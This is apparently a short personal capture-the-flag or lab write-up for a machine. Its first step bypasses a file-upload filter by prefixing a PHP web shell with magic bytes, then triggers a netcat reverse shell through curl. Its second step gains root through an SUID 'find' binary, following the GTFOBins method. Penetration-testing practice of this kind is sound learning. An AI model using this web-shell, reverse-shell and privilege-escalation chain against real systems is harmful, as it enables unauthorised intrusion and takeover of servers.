#box

*Created: 1/12/2026*

### Step 1

**Tags:** #hex #Hydra #Magic-Bytes #File-Upload-Bypass #Web-Shell #Reverse-Shell

**Command:**
```bash
echo -n -e '\x4D\x5A\n<?php system($_GET["cmd"]); ?>' > shell.php
curl -G --data-urlencode "cmd=nc 192.168.45.213 22 -e /bin/bash" http:/192.168.167.33/upload/shell.php
```

*Port: 80*

> 
> The machine shows a webapplication where an user has the possibility to upload a file. a `/backup` folder exposes the logics with which the upload is handled. Considering it requires some magic bytes we opt to inject magic bytes in a web shell and then achieve a reverse shell this way.

---

### Step 2

**Tags:** #GTFOBins #Linux #binaries #find #Custom-Binaries

🔗 **URL/Link:** https://gtfobins.github.io/gtfobins/find/#suid

**Command:**
```bash
/opt/fileS . -exec /bin/sh -p \; -quit
```

> 
> Inside the machine we discover a strange file with SUID set located at `/opt/fileS`. After an initial recognition the `--help`  reveals it is a `find` binary. We leverage it through the [find SUID GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid)

---

